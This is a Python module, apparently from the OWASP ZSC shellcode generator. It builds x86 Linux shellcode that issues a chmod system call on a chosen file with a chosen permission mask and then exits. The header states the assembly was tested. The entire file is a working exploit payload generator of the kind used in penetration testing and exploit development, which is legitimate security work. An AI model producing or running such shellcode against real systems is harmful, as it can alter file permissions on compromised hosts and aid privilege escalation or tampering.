"""
OWASP ZSC
# Status: Tested the module for ASM compile. ASM code is good
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp_zsc[at]googlegroups[dot]com ]
"""
from owasp_zsc.new_cores import base_module, stack, alert


class Module(base_module.BasePayload):
    target_file = base_module.OptString("", "Target file to change permission")
    permission = base_module.OptString("", "Permission mask (number)")

    def generate(self):
        payload = "push $0x0f\n"
        payload += "pop %eax\n"
        payload += stack.generate(self.permission, '%ecx', 'int')
        payload += stack.generate(self.target_file, '%ebx', 'string')
        payload += "mov %esp, %ebx\n"
        payload += "int $0x80\n"
        payload += "mov $0x01, %al\n"
        payload += "mov $0x01, %bl\n"
        payload += "int $0x80\n"
        return payload

    def run(self):
        if not self.target_file:
            alert.error("Target file and file's permissions are required")
            return
        if not self.permission:
            alert.error("Target's permission is required")
            return
        self.handle_generate(__name__)
